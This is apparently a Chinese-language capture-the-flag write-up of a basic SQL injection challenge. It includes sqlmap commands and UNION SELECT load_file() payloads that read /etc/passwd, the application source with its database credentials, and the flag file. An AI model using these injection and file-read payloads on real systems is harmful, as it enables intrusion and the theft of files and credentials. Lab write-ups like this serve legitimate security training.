## 题目
- 文章管理系统

## 题目信息
- **URL**: `http://challenge.qsnctf.com:44089/`
- **类型**: SQL注入 (SQLi)
- **难度**: 入门/基础

---

##  完整攻击链

### 发现注入点
http://challenge.qsnctf.com:44089/?id=1
- 参数 `id` 直接拼接进SQL语句，**无任何过滤**
- 源码证实：`SELECT title, word FROM articles WHERE id = $id`

### 工具确认（sqlmap）
```bash
sqlmap -u "http://challenge.qsnctf.com:44089/?id=1" --batch
```
- 确认数据库：**MySQL ≥ 5.0 (MariaDB fork)**
- 确认系统：**Linux (Alpine)**
- 确认注入类型：**联合查询注入**

### 读取源码
```bash
sqlmap --file-read="/var/www/html/index.php"
```
- 获取数据库明文账号：`root / root`
- 数据库名：`word`
- 确认 SQL 拼接漏洞位置

### 第四步：验证文件读取权限
```
?id=0 union select 1,load_file('/etc/passwd')--+
```
- 成功读取，确认 `load_file()` 可用
- 发现系统为 **Alpine Linux** 容器（`/bin/ash`）

### 直接读取 Flag 
```
?id=0 union select 1,load_file('/flag')--+
```
 **成功获取 Flag！**



##  知识点总结

| 知识点 | 说明 |
|--------|------|
| **联合查询注入** | `UNION SELECT` 拼接额外查询结果 |
| **load_file()** | MySQL内置函数，可读取服务器本地文件 |
| **Alpine容器** | CTF中flag常放于根目录 `/flag` |
| **sqlmap文件读取** | `--file-read` 可直接下载服务器文件 |
| **源码泄露** | 从源码中获取数据库配置、逻辑漏洞 |

---

##  补充说明
- 第一次直接尝试拼如 or 1=1 发现直接成功注入跳出假flag(sql+so+easy)
- 一直在尝试数据库找flag查表、查字典、dump数据应该在循环第二遍的时候就开始转变思路改用load_file()读文件系统


>  **核心思路**：数据库里没有flag时，优先考虑用 `load_file()` 读取文件系统，Alpine容器的flag几乎必在 `/flag`！